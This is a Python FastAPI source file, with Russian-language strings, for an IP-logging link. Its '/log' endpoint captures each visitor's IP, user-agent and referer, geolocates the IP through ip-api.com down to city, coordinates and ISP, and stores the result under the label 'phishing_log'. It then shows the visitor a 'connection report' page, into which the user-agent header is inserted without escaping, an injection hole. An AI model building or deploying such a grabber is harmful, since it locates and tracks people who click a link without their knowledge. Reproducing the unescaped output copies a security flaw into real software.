from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse
import datetime
import json
import db
import aiohttp

app = FastAPI()

@app.get("/log")
async def log_report(request: Request):
    client_ip = request.client.host
    user_agent = request.headers.get("user-agent", "unknown")
    referer = request.headers.get("referer", "none")

    # Получаем геоданные через ip-api.com
    geo = {}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"http://ip-api.com/json/{client_ip}?fields=status,country,regionName,city,zip,lat,lon,timezone,isp,org,as", timeout=5) as resp:
                geo = await resp.json()
    except:
        geo = {"status": "fail", "message": "Не удалось определить"}

    # Сохраняем в БД
    log_entry = {
        "ip": client_ip,
        "user_agent": user_agent,
        "referer": referer,
        "geo": geo,
        "time": datetime.datetime.now().isoformat()
    }
    db.add_log(user_id=0, action="phishing_log", query=client_ip, result=json.dumps(log_entry, ensure_ascii=False))

    # Готовим данные для отображения
    if geo.get("status") == "success":
        country = geo.get("country", "—")
        region = geo.get("regionName", "—")
        city = geo.get("city", "—")
        isp = geo.get("isp", "—")
        org = geo.get("org", "—")
        lat = geo.get("lat", "—")
        lon = geo.get("lon", "—")
    else:
        country = region = city = isp = org = lat = lon = "—"

    html = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Ваш отчёт</title>
        <style>
            body {{
                background: #f0f2f5;
                font-family: 'Segoe UI', Arial, sans-serif;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                margin: 0;
                padding: 20px;
            }}
            .report {{
                background: white;
                border-radius: 12px;
                padding: 40px 50px;
                max-width: 600px;
                width: 100%;
                box-shadow: 0 8px 30px rgba(0,0,0,0.15);
                border-left: 6px solid #4a76a8;
            }}
            h1 {{
                color: #2c3e50;
                margin-top: 0;
                font-weight: 500;
                font-size: 26px;
                display: flex;
                align-items: center;
                gap: 10px;
            }}
            .info {{
                margin: 20px 0;
                border-bottom: 1px solid #eee;
                padding: 12px 0;
                display: flex;
                justify-content: space-between;
            }}
            .label {{
                font-weight: 600;
                color: #555;
            }}
            .value {{
                color: #222;
                word-break: break-word;
                text-align: right;
                max-width: 60%;
            }}
            .badge {{
                background: #4a76a8;
                color: white;
                padding: 4px 12px;
                border-radius: 20px;
                font-size: 14px;
                display: inline-block;
            }}
            .footer {{
                margin-top: 30px;
                font-size: 13px;
                color: #888;
                text-align: center;
                border-top: 1px solid #eee;
                padding-top: 15px;
            }}
            @media (max-width: 500px) {{
                .report {{ padding: 20px; }}
                .info {{ flex-direction: column; align-items: flex-start; gap: 5px; }}
                .value {{ text-align: left; max-width: 100%; }}
            }}
        </style>
    </head>
    <body>
        <div class="report">
            <h1>
                <span>📡</span> Отчёт о подключении
                <span class="badge">{datetime.datetime.now().strftime("%H:%M")}</span>
            </h1>
            <div class="info"><span class="label">🌐 IP-адрес</span><span class="value"><code>{client_ip}</code></span></div>
            <div class="info"><span class="label">📍 Страна</span><span class="value">{country}</span></div>
            <div class="info"><span class="label">🏙️ Регион / Город</span><span class="value">{region}, {city}</span></div>
            <div class="info"><span class="label">🧭 Координаты</span><span class="value">{lat}, {lon}</span></div>
            <div class="info"><span class="label">🏢 Провайдер (ISP)</span><span class="value">{isp}</span></div>
            <div class="info"><span class="label">📋 Организация</span><span class="value">{org}</span></div>
            <div class="info"><span class="label">🖥️ User‑Agent</span><span class="value" style="font-size:12px;">{user_agent}</span></div>
            <div class="info"><span class="label">⏱️ Время запроса</span><span class="value">{datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</span></div>
            <div class="footer">
                Данные сохранены в лог-файл.<br>
                <span style="color:#aaa;">hsCmd beta — технический отчёт</span>
            </div>
        </div>
    </body>
    </html>
    """
    return HTMLResponse(content=html, status_code=200)
